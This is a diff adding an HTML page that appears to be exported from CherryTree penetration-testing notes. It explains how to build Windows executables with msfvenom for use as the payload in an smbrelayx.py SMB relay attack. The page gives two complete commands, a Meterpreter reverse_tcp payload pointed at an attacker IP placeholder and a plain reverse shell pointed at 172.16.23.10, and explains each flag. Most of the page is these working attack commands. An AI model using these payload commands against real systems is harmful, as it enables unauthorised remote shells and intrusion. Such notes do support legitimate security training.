@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>2. payload with msfneom</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>2. payload with msfneom</h1><br/>We have to create a file that will be the input for -e option(file to execute on the target machine) of smbrelayx.py command.<br />This payload will create a reverse_tcp connection with us.<br /><br /><br /><strong>Meterpreter Shell</strong><br /><br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_tcp&nbsp;LHOST=&lt;Attacker_IP&gt;&nbsp;LPORT=4455&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;smbexp.exe</div></div><br />    <strong>-p</strong> → indicates the payload to use<br />    <strong>LHOST</strong> →  is the host to which the payload will connect (our attacker machine)<br />    <strong>LPORT</strong> →  is the port on which the connection is establish<br />    <strong>-f</strong> →  specifies the format of the file (exe in our case)<br />    <strong>-o</strong> →  tells where to output the file<br />    <br />    <a href=""><img src="images/816-1.png" alt="images/816-1.png" /></a><br /><br /><br /><strong>Netcat Shell</strong><br /><div class="codebox"><div class="codebox">msfvenom&nbsp;-a&nbsp;x86&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=172.16.23.10&nbsp;LPORT=4444&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;smbexp.exe</div></div></div>
+</body>
+</html>
